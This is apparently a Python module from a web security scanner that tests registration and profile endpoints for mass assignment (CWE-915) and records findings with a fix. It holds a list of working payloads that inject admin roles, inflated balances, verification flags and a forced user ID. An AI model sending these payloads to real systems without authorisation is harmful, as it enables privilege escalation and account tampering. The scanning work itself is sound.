"""
CYPHEX DeepAgent — Mass Assignment (CWE-915)

Tests for mass assignment vulnerabilities where the server accepts extra
model attributes (isAdmin, role, balance, verified) passed in a POST body
and binds them directly to the user/object model without a whitelist.
"""
import json as _json
from backend.deepagents.base_deep_agent import BaseDeepAgent
from backend.backend.models.scan import ScanContext, Vuln
from backend.backend.models.agent_result import AgentResult
from backend.deepagents.oracle_attack import HttpRequest

# Extra fields to inject alongside normal registration data
MASS_ASSIGNMENT_PAYLOADS = [
    # Privilege escalation
    {"username": "hacker_ma", "password": "test1234!", "isAdmin": True, "role": "admin"},
    {"username": "hacker_ma2", "password": "test1234!", "admin": True, "is_staff": True},
    {"username": "hacker_ma3", "password": "test1234!", "role": "superuser", "level": 99},
    # Balance manipulation
    {"username": "hacker_ma4", "password": "test1234!", "balance": 999999, "credits": 9999},
    # Account verification bypass
    {"username": "hacker_ma5", "password": "test1234!", "verified": True, "email_confirmed": True},
    # ID injection (force a specific user ID)
    {"id": 1, "username": "hacker_ma6", "password": "test1234!"},
]

# Success signals after mass assignment
ESCALATION_SIGNALS = [
    "admin", "is_admin", "isadmin", "role", "superuser", "staff",
    "verified", "balance", "credits", '"admin":true', '"isAdmin":true',
]


def _preferred_write_method(profile, default: str = "POST") -> str:
    """
    Pick a state-changing HTTP method from an ASI EndpointProfile.

    `AttackSurfaceIndex.endpoints` maps path -> EndpointProfile, whose
    `.methods` is a *set* of verbs actually observed — not a dict. Prefer a
    write verb (POST/PUT/PATCH) since mass assignment only applies to those;
    fall back to `default` when the profile is missing or GET-only.
    """
    methods = getattr(profile, "methods", None) or set()
    for verb in ("POST", "PUT", "PATCH"):
        if verb in methods:
            return verb
    return default


class DeepMassAssignmentAgent(BaseDeepAgent):
    """
    Mass Assignment / Parameter Pollution DeepAgent (CWE-915).

    Probes registration, profile update, and user creation endpoints
    by injecting extra privileged fields alongside normal parameters.
    Confirms the vulnerability by checking if the extra fields are
    reflected in the response or stored (via follow-up GET).
    """
    PRIMARY_VULN_CLASS = "Mass Assignment / Parameter Pollution"

    async def run(self, context: ScanContext) -> AgentResult:
        # Find register/update/create endpoints
        target_endpoints = self._find_target_endpoints()

        for endpoint, method in target_endpoints[:3]:
            await self._probe_mass_assignment(endpoint, method, context)
            if self.vulns:
                break  # Stop after first confirmed finding

        return await super().run(context)

    def _find_target_endpoints(self) -> list[tuple[str, str]]:
        candidates = []
        for path in list(self.asi.endpoints):
            path_lower = path.lower()
            if any(kw in path_lower for kw in ("register", "signup", "create", "update", "profile", "user")):
                method = _preferred_write_method(self.asi.endpoints.get(path))
                candidates.append((path, method))
        if not candidates:
            # Default targets for Express apps
            candidates = [
                ("/api/users/register", "POST"),
                ("/api/users/update", "PUT"),
                ("/register", "POST"),
            ]
        return candidates

    async def _probe_mass_assignment(self, endpoint: str, method: str, context: ScanContext) -> None:
        for payload_dict in MASS_ASSIGNMENT_PAYLOADS:
            req = HttpRequest(
                method=method,
                path=endpoint,
                body=_json.dumps(payload_dict),
                headers={"Content-Type": "application/json"},
                payload=str(payload_dict),
            )
            status, body, elapsed, headers = await self._http_probe(req)
            self.asi.ingest_response(endpoint, method, req.body, status, body, headers)

            body_lower = body.lower()
            # Look for extra fields reflected back in response
            matched = [sig for sig in ESCALATION_SIGNALS if sig in body_lower]

            if status in (200, 201) and matched:
                self.console.print(
                    f"[red][DeepMassAssignment] Possible CONFIRMED at {endpoint}![/red]\n"
                    f"  Injected: {list(payload_dict.keys())}\n"
                    f"  Response signals: {matched}"
                )
                self.vulns.append(Vuln(
                    name="[DYNAMIC] Mass Assignment / Parameter Pollution",
                    cwe="CWE-915",
                    severity="High",
                    endpoint=endpoint,
                    payload=str(payload_dict)[:200],
                    confirmed=True,
                    evidence=(
                        f"HTTP {status} response reflected privileged fields {matched} "
                        f"after injecting extra params: {list(payload_dict.keys())}. "
                        f"Body: {body[:300]}"
                    ),
                    fix=(
                        "Use an explicit whitelist (allowlist) when binding request body "
                        "to model objects. Never use Object.assign(user, req.body) or "
                        "equivalent without field filtering."
                    ),
                ))
                return
